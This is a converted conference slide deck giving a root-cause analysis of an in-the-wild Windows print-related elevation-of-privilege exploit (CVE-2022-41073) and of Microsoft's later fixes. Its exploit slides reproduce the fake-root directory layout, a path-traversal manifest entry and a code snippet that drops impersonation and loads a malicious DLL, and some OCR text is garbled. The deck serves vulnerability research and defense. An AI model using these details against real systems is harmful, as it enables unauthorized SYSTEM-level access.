---
title: "The Print Spooler Bug that Wasn’t in the Print Spooler"
speakers: ["Maddie Stone", "James Forshaw"]
conference: "OffensiveCon"
conference_full: "OffensiveCon 2023"
edition: ""
year: 2023
source_pdf: "Offensivecon 2023 slides/Maddie Stone and James Forshaw _ The Print Spooler Bug that Wasn’t in the Print Spooler.pdf"
pages: 79
sha256: "e44d007961a6f4561bd873f82008249850677274c4541f0cea4c037f83fde4cb"
text_chars: 28085
ocr_pages: 14
has_ocr: true
redacted_secrets: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-11T23:23:30Z"
---
# The Print Spooler Bug that Wasn’t in the Print Spooler

**Speakers:** Maddie Stone, James Forshaw  
**Conference:** OffensiveCon 2023  
**Source:** `Offensivecon 2023 slides/Maddie Stone and James Forshaw _ The Print Spooler Bug that Wasn’t in the Print Spooler.pdf` (79 pages)


## Slide 1

Maddie Stone James Forshaw OffensiveCon 2023

## Slide 2

CVE-2022-41073

<u>https://googleprojectzero.github.io/0days-in-the-wild/0day-RCAs/2022/CVE-2022-41073.html</u>

## Slide 3

https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2022-41073

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Windows Print Spooler Elevation of Privilege Vulnerability
CVE-2022-41073
Released: Nov 8, 2022
Impact: Elevation of Privilege Max Severity: Important
Exploitability
The following table provides an exploitability assessment for this vulnerability at the time of original publication.
Publicly Disclosed Exploited Latest Software Release
No Yes Exploitation Detected
https://msrc.microsoft.com/update-guide/en-US/vulnerability/C VE-2022-41073
```

## Slide 4

Oct 2022 - winspool.drv!LoadNewCopy

HMODULE LoadNewCopy(LPCWSTR DllPath, DWORD dwFlags) { ULONG_PTR ulCookie; ActivateActCtx(ACTCTX_EMPTY, &ulCookie); HMODULE hModule = LoadLibraryExW(DllPath, NULL, dwFlags); // ...

}

## Slide 5

Nov 2022 - winspool.drv!LoadNewCopy

HMODULE LoadNewCopy(LPCWSTR DllPath, DWORD dwFlags) { ULONG_PTR ulCookie; ActivateActCtx(ACTCTX_EMPTY, &ulCookie); HMODULE hModule; HANDLE hToken; +   if (RevertToProcess(&hToken)) { hModule = LoadLibraryExW(DllPath, NULL, dwFlags); +       ResumeImpersonation(hToken); } // ... }

## Slide 6

<u>https://bugs.chromium.org/p/project-zero/issues/detail?id=240</u>

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Issue 240: Windows: DosDevices Impersonation Elevation of Privilege
Reported by forshaw@google.com on Tue, Jan 27, 2015
Windows: DosDevices Impersonation Elevation of Privilege
Platform: Windows 8.1 Update, Windows 7
Class: Elevation of Privilege
Summary:
When an application impersonates another user all file accesses are performed using
the current DOS device map under that token. This allows a user to force a system
service to load DLLs or start processes at higher privileges leading to EoP.
Description:
Each login session has a DosDevices mapping under \Sessions\@\DosDevices\X-Y where X-
Y is the login session ID. This object directory is writeable by the user. When a \??
\ path is looked up the kernel first checks the per-login session mapping for a
symlink to the drive mapping, if not found it will fallback to looking up in
\GLOBAL??. This mapping is also done when impersonating another user, which is
typical of system services when performing actions on behalf of another user.
httos://bugs.chromium.org/p/project-zero/issues/detail?id=240
```

## Slide 7

Impersonating Caller LoadLibrary(SharedLibrary.dll) C:\ Windows\System32\SharedLibrary.dll

## Slide 8

Impersonating Caller
LoadLibrary(SharedLibrary.dll)
Fake C:\ (MyFakeRoot) C:\
Windows\System32\SharedLibrary.dll Windows\System32\SharedLibrary.dll

## Slide 9

<u>https://twitter.com/tiraniddo/status/590931788006084609</u>

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
? James Forshaw
@tiraniddo
Interesting fix for CVE-2015-1644, MS added a new object attribute
(Ox800) which disables impersonation device map. Ldr code now uses
it.
7:34 PM - Apr 22, 2015
https://twitter.com/tiraniddo/status/590931788006084609
```

## Slide 10

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
© 38 security vendors and 1 sandbox flagged this file as malicious
08.294466e64fb5f84eeaSd8d1ba64054a61 abf66fdf85ac160a95b204b7b19f3 668.00 KB 2022-11-27 04:04:25 UTC
e0p.x64.exe Size 5 month
peexe 64bits runtimemodules assembly _direct-cpuclock-access
Community Score
DETECTION DETAILS RELATIONS BEHAVIOR COMMUNITY
Join the VT Community and enjoy additional community insights and crowdsourced detections, plus an API key to automate checks.
Basic properties
MDS 99af7b1564da8f5a6173a2ccbbb685dc
SHA becd8d70c3322889996e5faccef36d0ae7f387ab
SHA-256 €8a94466e64fb5f84eea5d8d1ba64054a6 1 abf66fdf85ac160a95b204b7b19f3
Vhash 065076655d155515655az677z53za7z1fz
Authentihash 9e80df296d8dd28967ac51761433533938a382becc 1 e12fb4d9951ee343e030f
Imphash 3bb20b77bde12023537462b7bf18043e
Rich PE header
hash
SSDEEP 12288:L01zS+VZL700k80V1CNWoViY9LWb6no4cSXpre:y 1eqL 70MO4NWoVSY6no4Jp
TLSH T189E46C56F7E800FAESB7923889635A05E772BC160721C7DF13A4426A1F377E0AE3A711
File type win32 EXE
Magic PE32+ executable for MS Windows (console) Mono/.Net assembly
ed2ed9898343e033f6b73ff0b8 1dd56f
TrID Microsoft Visual C++ compiled executable (generic) (43.3%) — Win64 Executable (generic) (27.6%) | Win16 NE executable (generic) (13.2%) _ OS/2 Executable (gener
Win/DOS Executable (5.2%)
DetectitEasy PE64 Compiler: Microsoft Visual C/C++ _ Linker: Microsoft Linker (14.31, Visual Studio 2022 17.1*) [Console64,console]
File size 668.00 KB (684032 bytes)
Cyren packer rte
History
Creation Time 2022-10-18 17:53:12 UTC
First Submission 2022-11-23 17:18:02 UTC
Last Submission 2022-11-23 17:18:02 UTC
Last Analysis 2022-11-27 04:04:25 UTC
```

## Slide 11

C:\MyFakeRoot ├── malicious.dll ├── MyFakeRoot │ ├── MyFakeRoot.MANIFEST │ └── prntvpt.dll ├── prntvpt.dll ├── temp.xml └── Windows ├── System32 │ └── DriverStore │ └── FileRepository │ └── prnms003.inf_amd64_454b8d4f31e80f7d │ └── Amd64 │ └── PrintConfig.dll └── WinSxS └── Manifests ├── amd64_microsoft.windows.common-controls_6595b64144ccf1df_5.82.19041.1110_none_792d1c772443f647.manifest └──

amd64_microsoft.windows.common-controls_6595b64144ccf1df_6.0.19041.1110_none_60b5254171f9507e.manifest

## Slide 12

## **C:\MyFakeRoot**

├── malicious.dll ├── MyFakeRoot │ ├── MyFakeRoot.MANIFEST │ └── prntvpt.dll ├── prntvpt.dll ├── temp.xml └── Windows ├── System32 │ └── DriverStore │ └── FileRepository │ └── prnms003.inf_amd64_454b8d4f31e80f7d │ └── Amd64 │ └── PrintConfig.dll └── WinSxS └── Manifests ├── amd64_microsoft.windows.common-controls_6595b64144ccf1df_5.82.19041.1110_none_792d1c772443f647.manifest └──

amd64_microsoft.windows.common-controls_6595b64144ccf1df_6.0.19041.1110_none_60b5254171f9507e.manifest

## Slide 13

C:\MyFakeRoot ├── malicious.dll ├── MyFakeRoot │ ├── MyFakeRoot.MANIFEST │ └── prntvpt.dll ├── prntvpt.dll ├── temp.xml └── Windows ├── System32 │ └── DriverStore │ └── FileRepository │ └── prnms003.inf_amd64_454b8d4f31e80f7d │ └── Amd64 │ └── PrintConfig.dll └── WinSxS └── Manifests ├── amd64_microsoft.windows.common-controls_6595b64144ccf1df_5.82.19041.1110_none_792d1c772443f647.manifest └── amd64_microsoft.windows.common-controls_6595b64144ccf1df_6.0.19041.1110_none_60b5254171f9507e.manifest

## Slide 14

C:\MyFakeRoot
├── malicious.dll
├── MyFakeRoot
│ ├── MyFakeRoot.MANIFEST
│ └── prntvpt.dll
├── prntvpt.dll
├── temp.xml
└── Windows
├── System32
│ └── DriverStore
│ └── FileRepository
│ └── prnms003.inf_amd64_454b8d4f31e80f7d
│ └── Amd64
│ └── PrintConfig.dll
└── WinSxS
└── Manifests
├──
amd64_microsoft.windows.common-controls_6595b64144ccf1df_5.82.19041.1110_none_792d1c772443f647.manifest
└──
amd64_microsoft.windows.common-controls_6595b64144ccf1df_6.0.19041.1110_none_60b5254171f9507e.manifest

## Slide 15

C:\MyFakeRoot
├── malicious.dll
├── MyFakeRoot
│ ├── MyFakeRoot.MANIFEST
│ └── prntvpt.dll
├── prntvpt.dll
├── temp.xml
└── Windows
├── System32
│ └── DriverStore
│ └── FileRepository
│ └── prnms003.inf_amd64_454b8d4f31e80f7d
│ └── Amd64
│ └── PrintConfig.dll
└── WinSxS
└── Manifests
├──
amd64_microsoft.windows.common-controls_6595b64144ccf1df_5.82.19041.1110_none_792d1c772443f647.manifest
└──
amd64_microsoft.windows.common-controls_6595b64144ccf1df_6.0.19041.1110_none_60b5254171f9507e.manifest

## Slide 16

What's in a MANIFEST?

## Slide 17

# DLL Hell

Application A
Install shared library.
SharedLibrary.dll
(version 2)
C:\Windows\System32

## Slide 18

# DLL Hell

Application A Application B
Install shared library.
SharedLibrary.dll
(version 1)
C:\Windows\System32

## Slide 19

# DLL Hell

Application A Application B
SharedLibrary.dll
(version 1)
C:\Windows\System32

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
DLL Hell
application_a.exe - Entry Point Not Found
(@@% The procedure entry point memepy could not be located in
(GJ) the dynamic link library
CAWindows\SYSTEM32\SharedLibrary.dll Application B
OK
C:\Windows\System32
```

## Slide 20

# Side by Side Assemblies

Application A Application B
SharedLibrary.dll SharedLibrary.dll
(version 2) (version 1)
C:\Windows\WinSxS

## Slide 21

# PE Imports

No Version Information

Version information but not detailed

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
PE Imports
BE Windows PowerShell x ap ||
PS D:\apps> Get-Win32ModuleImport .\application_a.exe
No Version
. DLLName FunctionCount DelayLoaded
Information d
KERNEL32.dLlL
SharedLibrary .d1l False
VCRUNTIME140.dLL False
api-ms—win-crt—stdio-l1-1-0.d1ll False
api-ms-—win-crt-runtime-l1-1-0.d1ll 18 False
: api-ms—win-crt—heap-1l1-1-0.d1ll 1 False
Version api-ms—win-crt—math-1l1-1-0.d1l 1 False
Hanieleaatclilelameleiaee 2Pi-ms-win-crt-locale-11-1-0.d1l 1 False
not detailed
```

## Slide 22

Application Manifest File Identity of the "Assembly" <assembly> <assemblyIdentity name= **"App.A"** version= **"1.0.0.0"** /> <description> **My APP A** </description> <dependency> <dependentAssembly> Dependencies of this Assembly <assemblyIdentity name= **"SharedLibrary"** version= **"2.0.0.0"** processorArchitecture= **"*"** publicKeyToken= **"6595b64144ccf1df"** language= **"*"** /> </dependentAssembly> </dependency> </assembly>

## Slide 23

# Using a Manifest

ACTCTX config = {}; Parse manifest file to an activation context config.cbSize = sizeof(config); config.lpSource = L"c:\\example.manifest"; HANDLE actctx = CreateActCtx(&config); ULONG_PTR cookie; Activate and load library ActivateActCtx(actctx, &cookie); HMODULE ret = LoadLibrary(L"SharedLibrary.dll"); DeactivateActCtx(0, cookie); ...

## Slide 24

# Assembly Searching Sequence

SXSSRV

SXSSRV
Application A
Application Manifest
<assembly>
 ...
<dependency>
<dependentAssembly>
<assemblyIdentity
name= "SharedLibrary"
version= "2.0.0.0"  />
</dependentAssembly>
 </dependency>
</assembly>

CSRSS

## Slide 25

# Assembly Searching Sequence

CSRSS
SXSSRV Version 2.0.1234.0
Application A
Application Manifest
<assembly>
 ...
<dependency>
<dependentAssembly>
<assemblyIdentity
name= "SharedLibrary"
version= "2.0.0.0"  />
</dependentAssembly> HKLM\SOFTWARE\Microsoft\Windows\
 </dependency>
</assembly> CurrentVersion\SideBySide

## Slide 26

# Assembly Searching Sequence

CSRSS
SXSSRV
Application A
Assembly Manifest
<assembly>
Application Manifest <assemblyIdentityname= "SharedLibrary"
version= "2.0.1234.0" />
<assembly>
 <file name= "SharedLibrary.dll" />
<dependency>  ...
</assembly>
<dependentAssembly>
<assemblyIdentity
name== "SharedLibrary"
version== "2.0.0.0"  />

Application A
Application Manifest

<assembly>

 ...
<dependency>
<dependentAssembly>
<assemblyIdentity
name== "SharedLibrary"
version== "2.0.0.0"  />
</dependentAssembly>
 </dependency>
</assembly>

C:\Windows\WinSxS\Manifests\ amd64_sharedlibrary_6595b64144ccf1df_2.0.1234.0.manifest

## Slide 27

# Assembly Searching Sequence

CSRSS
SXSSRV
Application A
Application Manifest
<assembly>
 ...
<dependency>
<dependentAssembly>
Activation Context<assemblyIdentity
name= "SharedLibrary"
version= "2.0.0.0"  />
</dependentAssembly>
 </dependency>
</assembly>

## Slide 28

# Assembly Manifest File

<assembly>

<assemblyIdentity name= **"SharedLibrary"** version= **"2.0.1234.0"** /> <dependency> More dependencies

<dependentAssembly>

<assemblyIdentity

name= **"SharedLibrary.resources"** version= **"2.0.0.0"** /> </dependentAssembly>

</dependency>

<file name= **"SharedLibrary.dll"** />

Assembly resources

</assembly>

## Slide 29

# Load DLL From Assembly Directory

Application A C:\Windows\WinSxS\amd64_sharedlibrary_6595b64
144ccf1df_2.0.1234.0
Load
SharedLibrary.dll
LdrLoadDll(...)
Activation Context
SharedLibrary.dll

## Slide 30

https://www.microsoft.com/en-us/security/blog/2022/07/27/untangling-knotweed-euro pean-private-sector-offensive-actor-using-0-day-exploits

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Untangling KNOTWEED: European private-sector
offensive actor using 0-day exploits
The CVE-2022-22047 vulnerability is related to an issue with activation context caching in the Client
Server Run-Time Subsystem (CSRSS) on Windows. At a high level, the vulnerability could enable an
attacker to provide a crafted assembly manifest, which would create a malicious activation context in the
activation context cache, for an arbitrary process. This cached context is used the next time the process
spawned.
https://www.microsoft.com/en-us/security/blog/2022/07/27/untangling-knotweed-euro
pean-private-sector-offensive-actor-using-0-day-exploits
```

## Slide 31

# Exploiting Activation Context Caching

CSRSS
SXSSRV Key Activation Context Cache
Assembly Manifest
Assembly Manifest
<assembly> Aliased Key
 ... <assembly>
<file loadFrom= "c:\evil.dll"  ...
      name= "SharedLibrary.dll" /> <file name= "SharedLibrary.dll" />
</assembly> </assembly>
C:\Windows\WinSxS\Manifests\
amd64_sharedlibrary_6595b64144ccf1df_2.0.1234.0.manifest
Malicious Application

## Slide 32

# Exploiting Activation Context Caching

CSRSS
SXSSRV Key Activation Context Cache
Assembly Manifest
Assembly Manifest
Application
<assembly>
 ... <assembly> <assembly>
<file loadFrom= "c:\evil.dll"  ...  ...
      name= "SharedLibrary.dll" /> <dependency> <file name= "SharedLibrary.dll" />
</assembly> <dependentAssembly> </assembly>
<assemblyIdentity
name= "SharedLibrary"
version= "2.0.0.0"  />
</dependentAssembly>
 </dependency>
</assembly>

## Slide 33

# Exploiting Activation Context Caching

CSRSS
SXSSRV Key Activation Context Cache
Assembly Manifest
Application
<assembly>
 ...
<file loadFrom= "c:\evil.dll" Activation
      name= "SharedLibrary.dll" />
</assembly> Context
evil.dll

## Slide 34

# Weak Caching Key

https://bugs.chromium.org/p/project-zero/issues/detail?id=1749

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Weak Caching Key
Issue 1749: Windows: CSRSS SxSSrv Cached Manifest EoP
Reported by forshaw@google.com on Thu, Jan 3, 2019, 11:47 AM PST
Windows: CSRSS SxSSrv Cached Manifest EoP
Platform: Windows 10 1809, 1709
Class: Elevation of Privilege
Security Boundary (per Windows Security Service Criteria): User boundary (and others)
Summary:
The SxS manifest cache in CSRSS uses a weak key allowing an attacker to fill a cache entry for a system binary
leading to EoP.
Description:
Manifest files are stored as XML, typically inside the PE resource section. To avoid having to parse the XML
file each time a process starts CSRSS caches the parsed activation context binary format in a simple database.
This cache can be queried during process startup or library loading by calling into CSRSS via CsrClientCall
resulting in calls to BaseSrvSxsCreateProcess or BaseSrvSxsCreateActivationContext inside SXSSRV.DLL.
https://bugs.chromium.org/p/project-zero/issues/detail?id=1749
```

## Slide 35

https://www.zerodayinitiative.com/blog/2023/1/23/activation-context-cache-poisoning-exploiting-csrss-for-privilege-escalation

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
INITIATIVE
CACHE POISONING:
EXPLOITING CSRSS FOR
PRIVILEGE ESCALATION
January 23, 2023 | Simon Zuckerbraun
https://www.zerodayinitiative.com/blog/2023/1/23/activation-context-cache-poisoning-exploiting-csrss-for-privilege-escalation
```

## Slide 36

# Parsing the Manifest during DLL Loading

NTSTATUS BasepProbeForDllManifest **(** HMODULE DllHandle **,** PCWSTR FullDllName **,**

HANDLE ***** ActCtx **) {** NTSTATUS result **=** LdrResFindResourceDirectory **(** DllHandle **,** Check for isolation RT_MANIFEST **,** ISOLATIONAWARE_MANIFEST_RESOURCE_ID **);** aware manifest **if (** NT_SUCCESS **(** result **)) {** ACTCTX config **;**

config **.** lpSource **=** FullDllName **;** Create an activation context config **.** lpResourceName **=** MAKEINTRESOURCE **(** ISOLATIONAWARE_MANIFEST_RESOURCE_ID **);** config **.** hModule **=** DllHandle **;**

***** ActCtx **=** CreateActCtxW **(&** context **);**

**if (*** ActCtx **==** INVALID_HANDLE_VALUE **) { return** NtCurrentTeb **()->** LastStatusValue **; } return** result **;**

## Slide 37

The Exploit

## Slide 38

C:\MyFakeRoot ├── malicious.dll ├── MyFakeRoot │ ├── MyFakeRoot.MANIFEST │ └── prntvpt.dll ├── prntvpt.dll ├── temp.xml └── Windows ├── System32 │ └── DriverStore │ └── FileRepository │ └── prnms003.inf_amd64_454b8d4f31e80f7d │ └── Amd64 │ └── PrintConfig.dll └── WinSxS └── Manifests ├── amd64_microsoft.windows.common-controls_6595b64144ccf1df_5.82.19041.1110_none_792d1c772443f647.manifest └──

amd64_microsoft.windows.common-controls_6595b64144ccf1df_6.0.19041.1110_none_60b5254171f9507e.manifest

## Slide 39

Does PrintConfig.dll have an Isolation Aware Manifest?

ISOLATIONAWARE DLL manifest

Manifest has dependencies

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Does PrintConfig.dll have an Isolation Aware Manifest?
BY Windows PowerShell
PS C:\> $m = Get-Win32ModuleResource C:\Windows\WinSxS\amd64_dual_prnms003.i
nf_31bf3856ad364e35_10.0.19041.2728_none_8b21f932f7c28aea\Amd64\PrintConfig.
dul 24 2
PS C:\> $x [xml] [System. Text.Encoding]: :UTF8.GetString($m.ToArray())
PS C:\> $x.assembly.dependency.dependentAssembly.assemblyIdentity
type : win32
name : Microsoft.Windows.Common-Controls
version : 6.0.0.0
processorArchitecture : amd64
pubLicKeyToken : 6595b64144ccfldf
Language AS
```

## Slide 40

### Normal User – MEDIUM integrity

### SYSTEM integrity

exploit.exe

Fake C:\ (MyFakeRoot)

csrss.exe C:\Windows\WinSxS

## Slide 41

### Normal User – MEDIUM integrity

exploit.exe

### SYSTEM integrity

printfilterpipelinesvc.exe Impersonating Caller LoadLibrary(PrintConfig.dll) csrss.exe

Fake C:\ (MyFakeRoot)

C:\Windows\WinSxS

## Slide 42

### Normal User – MEDIUM integrity

exploit.exe

Fake C:\ (MyFakeRoot)

SYSTEM integrity printfilterpipelinesvc.exe Impersonating Caller LoadLibrary(PrintConfig.dll) csrss.exe Impersonating Caller SXSSRV C:\Windows\WinSxS

## Slide 43

### Normal User – MEDIUM integrity

exploit.exe

Fake C:\ (MyFakeRoot)

Windows/WinSxS

SYSTEM integrity printfilterpipelinesvc.exe Impersonating Caller LoadLibrary(PrintConfig.dll) csrss.exe Impersonating Caller SXSSRV C:\Windows\WinSxS

## Slide 44

# Exploit Adds to Common Controls SxS Manifests

<dependentAssembly> <assemblyIdentity name= **"..\..\..\..\..\..\MyFakeRoot\MyFakeRoot"** version= **"1.0.0.0"** processorArchitecture= **"amd64"** language= **"*"** publicKeyToken= **"6595b64144ccf1df"** type= **"win32"** /> </dependentAssembly>

## Slide 45

# Exploit Adds to Common Controls SxS Manifests

<dependentAssembly> <assemblyIdentity name= **"..\..\..\..\..\..\MyFakeRoot\MyFakeRoot"** version= **"1.0.0.0"** processorArchitecture= **"amd64"** language= **"*"** publicKeyToken= **"6595b64144ccf1df"** type= **"win32"** /> </dependentAssembly>

## Slide 46

### Normal User – MEDIUM integrity

exploit.exe

Fake C:\ (MyFakeRoot)

MyFakeRoot\MyFakeRoot.MANIFEST

SYSTEM integrity printfilterpipelinesvc.exe Impersonating Caller LoadLibrary(PrintConfig.dll) csrss.exe Impersonating Caller SXSSRV C:\Windows\WinSxS

## Slide 47

# MyFakeRoot.MANIFEST

<assembly> <assemblyIdentity name= **"..\..\..\..\..\..\MyFakeRoot\MyFakeRoot"** version= **"1.0.0.0"** processorArchitecture= **"amd64"** publicKeyToken= **"6595b64144ccf1df"** type= **"win32"** /> <file name= **"prntvpt.dll"** /> </assembly>

## Slide 48

# MyFakeRoot.MANIFEST

<assembly> <assemblyIdentity name= **"..\..\..\..\..\..\MyFakeRoot\MyFakeRoot"** version= **"1.0.0.0"** processorArchitecture= **"amd64"** Redirect publicKeyToken= **"6595b64144ccf1df"** type= **"win32"** /> <file name= **"** **prntvpt.dll "** /> </assembly>

Redirect _prntvpt.dll_

## Slide 49

Normal User – MEDIUM integrity

Fake C:\ (MyFakeRoot) MyFakeRoot\prntvpt.dll

SYSTEM integrity printfilterpipelinesvc.exe Impersonating Caller LoadLibrary(PrintConfig.dll) Activation Context csrss.exe Impersonating Caller SXSSRV

## Slide 50

# Modification to prntvpt.dll

ATL::_dynamic_initializer_for::AtlBaseModule::()

HMODULE AutoMapNamedElementOnVisit(...) { SetThreadToken(NULL, NULL); return LoadLibraryExW(L"C:\\MyFakeRoot\\malicious.dll", NULL, LOAD_WITH_ALTERED_SEARCH_PATH); }

## Slide 51

# Modification to prntvpt.dll

ATL::_dynamic_initializer_for::AtlBaseModule::()

HMODULE AutoMapNamedElementOnVisit(...) { Turns off impersonation SetThreadToken(NULL, NULL); return LoadLibraryExW(L"C:\\MyFakeRoot\\malicious.dll", NULL, LOAD_WITH_ALTERED_SEARCH_PATH); }

## Slide 52

# Modification to prntvpt.dll

ATL::_dynamic_initializer_for::AtlBaseModule::()

HMODULE AutoMapNamedElementOnVisit(...) { SetThreadToken(NULL, NULL); return LoadLibraryExW(L"C:\\MyFakeRoot\\malicious.dll", NULL, LOAD_WITH_ALTERED_SEARCH_PATH); }

Load final payload DLL.

## Slide 53

### Normal User – MEDIUM integrity

Fake C:\ (MyFakeRoot) MyFakeRoot\malicious.dll

SYSTEM integrity printfilterpipelinesvc.exe

PrintConfig.dll (fake) prntvpt.dll malicious.dll

## Slide 54

Nov 2022 - winspool.drv!LoadNewCopy

HMODULE LoadNewCopy(LPCWSTR DllPath, DWORD dwFlags) { ULONG_PTR ulCookie; ActivateActCtx(ACTCTX_EMPTY, &ulCookie); HMODULE hModule; HANDLE hToken; +   if (RevertToProcess(&hToken)) { hModule = LoadLibraryExW(DllPath, NULL, dwFlags); +       ResumeImpersonation(hToken); } // ... }

## Slide 55

Dec 2022 - sxssrv!BasepSxsCreateFileStreamEx

DWORD dwAttr = OBJ_CASE_INSENSITIVE; + if (AssemblyManifestRedirectTrust::IsEnabled() && +   ((dwFlags & 0x7000) == 0x7000)) { +   dwAttr |= OBJ_IGNORE_IMPERSONATED_DEVICEMAP; + } OBJECT_ATTRIBUTES ObjectAttributes; InitializeObjectAttributes(&ObjectAttr, &Path, dwAttr, NULL, NULL); HANDLE hFile; NtOpenFile(&hFile, FILE_GENERIC_READ, &ObjectAttributes, ...)

## Slide 56

Dec 2022 - sxssrv!BasepSxsCreateFileStreamEx

DWORD dwAttr = OBJ_CASE_INSENSITIVE; + if ( AssemblyManifestRedirectTrust::IsEnabled() && +   ((dwFlags & 0x7000) == 0x7000)) { +   dwAttr |= OBJ_IGNORE_IMPERSONATED_DEVICEMAP; + } OBJECT_ATTRIBUTES ObjectAttributes; InitializeObjectAttributes(&ObjectAttr, &Path, dwAttr, NULL, NULL);

HANDLE hFile; NtOpenFile(&hFile, FILE_GENERIC_READ, &ObjectAttributes, ...)

## Slide 57

Dec 2022 - sxssrv!BasepSxsCreateFileStreamEx

DWORD dwAttr = OBJ_CASE_INSENSITIVE; + if (AssemblyManifestRedirectTrust::IsEnabled() && + ((dwFlags & 0x7000) == 0x7000)) { +   dwAttr |= OBJ_IGNORE_IMPERSONATED_DEVICEMAP; + } Only true if the process explicitly OBJECT_ATTRIBUTES ObjectAttributes; enabled the mitigation. InitializeObjectAttributes(&ObjectAttr, &Path, dwAttr, NULL, NULL);

HANDLE hFile;

NtOpenFile(&hFile, FILE_GENERIC_READ, &ObjectAttributes, ...)

## Slide 58

Dec 2022 - sxssrv!BasepSxsCreateFileStreamEx

DWORD dwAttr = OBJ_CASE_INSENSITIVE; + if (AssemblyManifestRedirectTrust::IsEnabled() && +   ((dwFlags & 0x7000) == 0x7000)) { + dwAttr |= OBJ_IGNORE_IMPERSONATED_DEVICEMAP; + } OBJECT_ATTRIBUTES ObjectAttributes; InitializeObjectAttributes(&ObjectAttr, &Path, dwAttr, NULL, NULL);

HANDLE hFile;

NtOpenFile(&hFile, FILE_GENERIC_READ, &ObjectAttributes, ...)

## Slide 59

Dec 2022 - kernel32!BasepCreateActCtx

DWORD dwFlags = 0; if (AssemblyManifestRedirectTrust::IsEnabled()) { if (IsSystemProcess()) dwFlags |= 0x1000; if (NtCurrentTeb()->IsImpersonating) dwFlags |= 0x2000; if (((dwFlags & 0x3000) == 0x3000) && KernelBaseAssemblyManifestIgnoreImpersonated) { dwFlags |= 0x4000; } } CsrBasepCreateActCtxCommon(dwFlags, ...);

## Slide 60

# Dec 2022 - kernel32!BasepCreateActCtx

DWORD dwFlags = 0; if (AssemblyManifestRedirectTrust::IsEnabled()) { if (IsSystemProcess()) dwFlags |= 0x1000;

Checks for "System" Integrity Level

if (NtCurrentTeb()->IsImpersonating) dwFlags |= 0x2000; if (((dwFlags & 0x3000) == 0x3000) && KernelBaseAssemblyManifestIgnoreImpersonated) { dwFlags |= 0x4000; } } CsrBasepCreateActCtxCommon(dwFlags, ...);

Is the thread currently impersonating?

## Slide 61

Dec 2022 - kernel32!BasepCreateActCtx

DWORD dwFlags = 0; if (AssemblyManifestRedirectTrust::IsEnabled()) { if (IsSystemProcess()) dwFlags |= 0x1000; if (NtCurrentTeb()->IsImpersonating) dwFlags |= 0x2000; if (((dwFlags & 0x3000) == 0x3000) && KernelBaseAssemblyManifestIgnoreImpersonated) { dwFlags |= 0x4000; } } CsrBasepCreateActCtxCommon(dwFlags, ...);

Is mitigation enabled? If so final flags is 0x7000.

## Slide 62

Dec 2022 - kernelbase!SetProcessMitigationPolicy

// ...

+ if (MitigationPolicy == ProcessUserPointerAuthPolicy && + AssemblyManifestRedirectTrust::IsEnabled()) { +    BOOLEAN bEnable = *(PDWORD)lpBuffer != 0; +    KernelBaseAssemblyManifestIgnoreImpersonated = bEnable; + }

// ...

## Slide 63

# Dec 2022 - kernelbase!SetProcessMitigationPolicy

Enumerated value 17, this is the SDK name which is clearly wrong! // ...

+ if (MitigationPolicy == ProcessUserPointerAuthPolicy && +    AssemblyManifestRedirectTrust::IsEnabled()) {

+    BOOLEAN bEnable = *(PDWORD)lpBuffer != 0;

+    KernelBaseAssemblyManifestIgnoreImpersonated = bEnable; + }

// ...

## Slide 64

Dec 2022 - kernelbase!SetProcessMitigationPolicy

// ...

- + if (MitigationPolicy == ProcessUserPointerAuthPolicy &&

- +    AssemblyManifestRedirectTrust::IsEnabled()) {

- +    BOOLEAN bEnable = *(PDWORD)lpBuffer != 0;

+ KernelBaseAssemblyManifestIgnoreImpersonated = bEnable; + }

// ...

Sets a global variable.

## Slide 65

Jan 2023 - printfilterpipelinesvc!wWinMain

// ... + DWORD Policy = TRUE; + SetProcessMitigationPolicy(ProcessUserPointerAuthPolicy, +     &Policy, sizeof(Policy)); // ...

## Slide 66

# CVE-2022-41073 Root Cause

**The user can remap the root drive (C:\) for privileged processes during impersonation.**

**A design flaw which has been known about since at least 2015.**

## Slide 67

Variant Analysis

## Slide 68

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Windows Print Spooler Elevation of Privilege Vulnerability
CVE-2022-29104
Security Vulnerability
Released: May 10, 2022 Last updated: Jun 3, 2022
Acknowledgements
National Security Agency
Oliver Lyak (@ly4k_) working with Trend Micro Zero Day Initiative
```

## Slide 69

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
y 29 (0) 29 security vendors and no sandboxes flagged this file as m:
/68
cOb2aef9bea28b4b10323cfe07e896e33b346917a8c2d6043cc4001d81094b9d
Imprint.exe
peexe assembly runtime-modules detect-debug-environment exploit. direct-cpu-clock-access__cve-2022-29104
Community Score
DETECTION DETAILS
Join the VT Community and enjoy additional community insights and crowdsourced detections, plus an API key to automate checks.
Popular threat label (} trojan.exp!
Security vendors’ analysis ()
Ad-Aware
ALYac
AVG
BitDefender
Cybereason
Cynet
RELATIONS BEHAVIOR
Threat categories trojan
© Trojan.Generic.31510283
© Trojan.Generic.31510283
© wine4:cve-2022-29104-A [Expl]
© Trojan.Generic.31510283
© Malicious.dc8d93
© Malicious (score: 99)
COMMUNITY
Alibaba
Avast
Avira (no cloud)
Bkav Pro
Cylance
Elastic
191.00 KB 2022-07-05 13:46:14 UTC
Size
10 months ago
Family labels exp!
eC
°°
9
EXE
Do you want to automate checks?
© Exploit:application/CVE-2022-29104.472...
© win64:cve-2022-29104-A [Expl]
© TR/Redcap.bevxr
© waz2.aldetectNet.01
© Unsafe
© Malicious (moderate Confidence)
```

## Slide 70

Normal User – MEDIUM integrity SYSTEM integrity
printfilterpipelinesvc.exe
Impersonating Caller
exploit.exe
LoadLibrary(PrintConfig.dll)
csrss.exe
Fake C:\ (MyFakeRoot) Impersonating Caller
SXSSRV
Windows/WinSxS
C:\Windows\WinSxS
spoolsv.exe

## Slide 71

May 2022 – localspl.dll

